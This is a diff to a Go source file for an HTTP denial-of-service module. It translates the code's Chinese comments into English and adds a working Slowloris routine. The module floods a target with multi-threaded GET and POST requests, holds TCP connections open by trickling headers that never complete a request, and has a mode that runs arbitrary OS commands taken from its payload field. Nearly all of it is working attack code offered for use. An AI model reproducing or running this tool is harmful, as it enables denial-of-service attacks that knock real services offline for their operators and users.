@@ -5,26 +5,26 @@ import (
 	"context"
 	"fmt"
 	"io"
+	"net"
 	"net/http"
 	"net/url"
+	"os/exec"
 	"strings"
 	"sync"
 	"sync/atomic"
 	"time"
-	"os/exec"
 )
 
-
-// HTTP 定义HTTP攻击的配置和统计信息
+// HTTP defines the configuration and statistics for an HTTP attack
 type HTTP struct {
-	Method      string            // 攻击方法：GET, POST
-	Target      string            // 目标URL
-	Path        string            // 可选路径
-	Threads     int               // 攻击线程数
-	Header		map[string]string // 额外请求头
-	Payload     string            // POST请求负载，也可以用来传输os命令
+	Method  string            // Attack method: GET, POST
+	Target  string            // Target URL
+	Path    string            // Optional path
+	Threads int               // Number of attack threads
+	Header  map[string]string // Additional request headers
+	Payload string            // POST request payload, can also be used for OS commands
 
-	// 统计字段
+	// Statistics fields
 	sentRequests  int64
 	recvResponses int64
 	sentBytes     int64
@@ -33,21 +33,21 @@ type HTTP struct {
 	startTime     time.Time
 }
 
-// HTTPStart 开始HTTP攻击
+// HTTPStart starts the HTTP attack
 func (h *HTTP) HTTPStart() {
-	// 初始化
+	// Initialization
 	h.startTime = time.Now()
-	
-	// 初始化带宽限制器
+
+	// Initialize bandwidth limiter
 	InitBandwidthLimiter()
-	
-	fmt.Printf("[+] 开始 %s 攻击目标: %s\n", h.Method, h.Target)
-	fmt.Printf("[+] 线程数: %d\n", h.Threads)
+
+	fmt.Printf("[+] Starting %s attack on target: %s\n", h.Method, h.Target)
+	fmt.Printf("[+] Number of threads: %d\n", h.Threads)
 	if len(h.Header) > 0 {
-		fmt.Println("[+] 使用自定义请求头")
+		fmt.Println("[+] Using custom request headers")
 	}
-	
-	// 根据Method选择攻击方式
+
+	// Select attack method based on Method
 	switch h.Method {
 	case "GET":
 		h.floodAttack(h.httpGet)
@@ -58,30 +58,30 @@ func (h *HTTP) HTTPStart() {
 	case "SLOWLORIS":
 		h.floodAttack(h.Slowloris)
 	default:
-		fmt.Printf("不支持的HTTP攻击方法: %s\n", h.Method)
+		fmt.Printf("Unsupported HTTP attack method: %s\n", h.Method)
 		return
 	}
 
 	h.printSummary()
 }
 
-// 攻击函数类型
+// Attack function type
 type attackFunc func() error
 
-// floodAttack 执行洪水攻击
+// floodAttack performs a flood attack
 func (h *HTTP) floodAttack(attackVector attackFunc) {
 	var wg sync.WaitGroup
-	
-	// 创建错误通道用于聚合错误报告
+
+	// Create an error channel for aggregating error reports
 	errorChan := make(chan error, h.Threads)
-	
-	// 启动错误监控协程
+
+	// Start an error monitoring goroutine
 	go func() {
 		for err := range errorChan {
 			atomic.AddInt64(&h.connErrors, 1)
-			// 错误记录策略：每50个错误记录一次，但确保记录第一个错误
+			// Error logging strategy: log every 50 errors, but ensure the first error is logged
 			if h.connErrors <= 1 || h.connErrors%50 == 0 {
-				fmt.Printf("HTTP攻击错误: %v (错误计数: %d)\n", err, h.connErrors)
+				fmt.Printf("HTTP attack error: %v (Error count: %d)\n", err, h.connErrors)
 			}
 		}
 	}()
@@ -93,31 +93,31 @@ func (h *HTTP) floodAttack(attackVector attackFunc) {
 			for {
 				select {
 				case <-STOP:
-					fmt.Printf("线程 %d: HTTP攻击终止\n", id)
+					fmt.Printf("Thread %d: HTTP attack terminated\n", id)
 					return
 				default:
-					// 应用带宽限制 - 估算请求大小
+					// Apply bandwidth limiting - estimate request size
 					if bandwidthLimiter != nil {
-						// 估计请求大小 (基于请求头和负载)
-						reqSize := 300 // 基本请求大小估算 (可根据实际情况调整)
+						// Estimate request size (based on headers and payload)
+						reqSize := 300 // Base request size estimate (adjust as needed)
 						if h.Method == "POST" {
 							reqSize += len(h.Payload)
 						}
-						
-						// 等待足够的带宽令牌
+
+						// Wait for sufficient bandwidth tokens
 						if err := bandwidthLimiter.WaitN(context.Background(), reqSize); err != nil {
-							errorChan <- fmt.Errorf("带宽限制等待失败: %v", err)
-							time.Sleep(100 * time.Millisecond) // 添加简单的回退策略
+							errorChan <- fmt.Errorf("Bandwidth limit wait failed: %v", err)
+							time.Sleep(100 * time.Millisecond) // Add a simple fallback strategy
 							continue
 						}
 					}
-					
+
 					if err := attackVector(); err != nil {
 						errorChan <- err
-						// 添加简单的指数回退策略
+						// Add a simple exponential backoff strategy
 						backoff := time.Duration(50*(atomic.LoadInt64(&h.connErrors)%20)) * time.Millisecond
 						if backoff > 2*time.Second {
-							backoff = 2 * time.Second // 最大回退时间
+							backoff = 2 * time.Second // Maximum backoff time
 						}
 						time.Sleep(backoff)
 					}
@@ -125,16 +125,16 @@ func (h *HTTP) floodAttack(attackVector attackFunc) {
 			}
 		}(i)
 	}
-	
+
 	wg.Wait()
-	close(errorChan) // 关闭错误通道
+	close(errorChan) // Close the error channel
 }
 
-// httpGet 执行GET请求攻击 - 不等待响应版本
+// httpGet performs a GET request attack - non-blocking response version
 func (h *HTTP) httpGet() error {
 	client := h.newClient()
 
-	// 构建请求目标
+	// Build request target
 	reqTarget := h.Target
 	if h.Path != "" {
 		parsedURL, err := url.Parse(h.Target)
@@ -146,33 +146,33 @@ func (h *HTTP) httpGet() error {
 
 	req, err := http.NewRequest("GET", reqTarget, nil)
 	if err != nil {
-		return fmt.Errorf("创建GET请求失败: %v", err)
+		return fmt.Errorf("Failed to create GET request: %v", err)
 	}
 
-	// 添加请求头
+	// Add request headers
 	h.addHeaders(req)
 
-	// 记录发送请求
+	// Record sent request
 	atomic.AddInt64(&h.sentRequests, 1)
 	reqSize := estimateRequestSize(req)
 	atomic.AddInt64(&h.sentBytes, int64(reqSize))
 
-	// 使用goroutine异步发送请求并处理响应
+	// Use a goroutine to asynchronously send the request and handle the response
 	go func() {
 		resp, err := client.Do(req)
 		if err != nil {
-			// 仅忽略错误，不中断主流程
+			// Ignore errors, do not interrupt the main flow
 			return
 		}
-		
-		// 记录接收到响应
+
+		// Record received response
 		atomic.AddInt64(&h.recvResponses, 1)
-		
-		// 异步读取并丢弃响应体，但统计大小
+
+		// Asynchronously read and discard the response body, but record its size
 		go func() {
 			defer resp.Body.Close()
 			n, err := io.Copy(io.Discard, resp.Body)
-			// 忽略读取错误
+			// Ignore read errors
 			_ = err
 			atomic.AddInt64(&h.recvBytes, n)
 		}()
@@ -181,10 +181,97 @@ func (h *HTTP) httpGet() error {
 	return nil
 }
 
-// httpPost 执行POST请求攻击 - 不等待响应版本
+// httpPost performs a POST request attack - non-blocking response version
 func (h *HTTP) httpPost() error {
 	client := h.newClient()
 
+	// Build request target
+	reqTarget := h.Target
+	if h.Path != "" {
+		parsedURL, err := url.Parse(h.Target)
+		if err == nil {
+			parsedURL.Path = h.Path
+			reqTarget = parsedURL.String()
+		}
+	}
+
+	// Create request body
+	body := strings.NewReader(h.Payload)
+	req, err := http.NewRequest("POST", reqTarget, body)
+	if err != nil {
+		return fmt.Errorf("Failed to create POST request: %v", err)
+	}
+
+	// Add request headers
+	h.addHeaders(req)
+
+	// Ensure content type is correctly set (if not specified in custom headers)
+	if _, hasContentType := req.Header["Content-Type"]; !hasContentType {
+		// Attempt to guess content type based on payload
+		if strings.HasPrefix(h.Payload, "{") || strings.HasPrefix(h.Payload, "[") {
+			req.Header.Set("Content-Type", "application/json")
+		} else if strings.Contains(h.Payload, "&") && strings.Contains(h.Payload, "=") {
+			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+		} else {
+			req.Header.Set("Content-Type", "text/plain")
+		}
+	}
+
+	// Record sent request
+	atomic.AddInt64(&h.sentRequests, 1)
+	reqSize := estimateRequestSize(req) + len(h.Payload)
+	atomic.AddInt64(&h.sentBytes, int64(reqSize))
+
+	// Use a goroutine to asynchronously send the request and handle the response
+	go func() {
+		resp, err := client.Do(req)
+		if err != nil {
+			// Ignore errors, do not interrupt the main flow
+			return
+		}
+
+		// Record received response
+		atomic.AddInt64(&h.recvResponses, 1)
+
+		// Asynchronously read and discard the response body, but record its size
+		go func() {
+			defer resp.Body.Close()
+			n, err := io.Copy(io.Discard, resp.Body)
+			// Ignore read errors
+			_ = err
+			atomic.AddInt64(&h.recvBytes, n)
+		}()
+	}()
+
+	return nil
+}
+
+// curl executes a command, leveraging curl's rate-limiting mechanism
+func (h *HTTP) curl() error {
+	args := strings.Fields(h.Payload)
+	if len(args) == 0 {
+		return fmt.Errorf("empty payload")
+	}
+
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+
+	go func() {
+		select {
+		case <-STOP:
+			cancel() // Cancel context on termination signal
+		case <-ctx.Done():
+			return
+		}
+	}()
+
+	cmd := exec.CommandContext(ctx, args[0], args[1:]...) // Bind context
+	_ = cmd.Run()                                         // Ignore errors
+	return nil
+}
+
+// Slowloris uses a slow attack strategy
+func (h *HTTP) Slowloris() error {
 	// 构建请求目标
 	reqTarget := h.Target
 	if h.Path != "" {
@@ -195,80 +282,71 @@ func (h *HTTP) httpPost() error {
 		}
 	}
 
-	// 创建请求体
-	body := strings.NewReader(h.Payload)
-	req, err := http.NewRequest("POST", reqTarget, body)
+	// 创建 TCP 连接而不是使用 http.Client
+	// 以便控制发送数据的时机
+	parsedURL, err := url.Parse(reqTarget)
 	if err != nil {
-		return fmt.Errorf("创建POST请求失败: %v", err)
+		return fmt.Errorf("解析 URL 失败: %v", err)
 	}
 
-	// 添加请求头
-	h.addHeaders(req)
-
-	// 确保内容类型正确设置 (如果没有在自定义头部中指定)
-	if _, hasContentType := req.Header["Content-Type"]; !hasContentType {
-		// 根据payload尝试猜测内容类型
-		if strings.HasPrefix(h.Payload, "{") || strings.HasPrefix(h.Payload, "[") {
-			req.Header.Set("Content-Type", "application/json")
-		} else if strings.Contains(h.Payload, "&") && strings.Contains(h.Payload, "=") {
-			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	// 确定主机和端口
+	host := parsedURL.Host
+	if !strings.Contains(host, ":") {
+		if parsedURL.Scheme == "https" {
+			host = host + ":443"
 		} else {
-			req.Header.Set("Content-Type", "text/plain")
+			host = host + ":80"
 		}
 	}
 
-	// 记录发送请求
+	// 建立 TCP 连接
+	conn, err := net.DialTimeout("tcp", host, 10*time.Second)
+	if err != nil {
+		return fmt.Errorf("建立连接失败: %v", err)
+	}
+	defer conn.Close()
+
+	// 记录已发送的请求
 	atomic.AddInt64(&h.sentRequests, 1)
-	reqSize := estimateRequestSize(req) + len(h.Payload)
-	atomic.AddInt64(&h.sentBytes, int64(reqSize))
 
-	// 使用goroutine异步发送请求并处理响应
-	go func() {
-		resp, err := client.Do(req)
-		if err != nil {
-			// 仅忽略错误，不中断主流程
-			return
+	// 发送初始不完整的 HTTP 请求
+	initialReq := fmt.Sprintf("GET %s HTTP/1.1\r\n", parsedURL.Path)
+	initialReq += fmt.Sprintf("Host: %s\r\n", parsedURL.Hostname())
+	initialReq += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
+
+	// 添加来自 h.Header 的任何自定义头
+	for k, v := range h.Header {
+		initialReq += fmt.Sprintf("%s: %s\r\n", k, v)
+	}
+
+	// 发送初始头信息但不完成请求
+	_, err = conn.Write([]byte(initialReq))
+	if err != nil {
+		return fmt.Errorf("发送初始头信息失败: %v", err)
+	}
+
+	// 记录发送的字节数
+	sentBytes := len(initialReq)
+	atomic.AddInt64(&h.sentBytes, int64(sentBytes))
+
+	// 通过定期发送额外的头信息来保持连接活动
+	ticker := time.NewTicker(15 * time.Second)
+	defer ticker.Stop()
+
+	for {
+		select {
+		case <-STOP:
+			return nil
+		case <-ticker.C:
+			// 发送额外的头信息以保持连接活动
+			// 但永远不完成请求
+			additionalHeader := fmt.Sprintf("X-a: %d\r\n", time.Now().UnixNano())
+			_, err := conn.Write([]byte(additionalHeader))
+			if err != nil {
+				// 连接可能被服务器关闭
+				return fmt.Errorf("连接被服务器关闭: %v", err)
+			}
+			atomic.AddInt64(&h.sentBytes, int64(len(additionalHeader)))
 		}
-		
-		// 记录接收到响应
-		atomic.AddInt64(&h.recvResponses, 1)
-		
-		// 异步读取并丢弃响应体，但统计大小
-		go func() {
-			defer resp.Body.Close()
-			n, err := io.Copy(io.Discard, resp.Body)
-			// 忽略读取错误
-			_ = err
-			atomic.AddInt64(&h.recvBytes, n)
-		}()
-	}()
-
-	return nil
+	}
 }
-
-// curl执行命令，可以利用curl限速机制
-func (h *HTTP) curl() error {
-    args := strings.Fields(h.Payload)
-    if len(args) == 0 {
-        return fmt.Errorf("empty payload")
-    }
-
-    ctx, cancel := context.WithCancel(context.Background())
-    defer cancel()
-
-    go func() {
-        select {
-        case <-STOP:
-            cancel() // 收到终止信号时取消上下文
-        case <-ctx.Done():
-            return
-        }
-    }()
-
-    cmd := exec.CommandContext(ctx, args[0], args[1:]...) // 绑定上下文
-    _ = cmd.Run() // 忽略错误
-    return nil
-}
-
-// Slowloris 使用慢速攻击策略
-func (h *HTTP) Slowloris() error{ return nil}
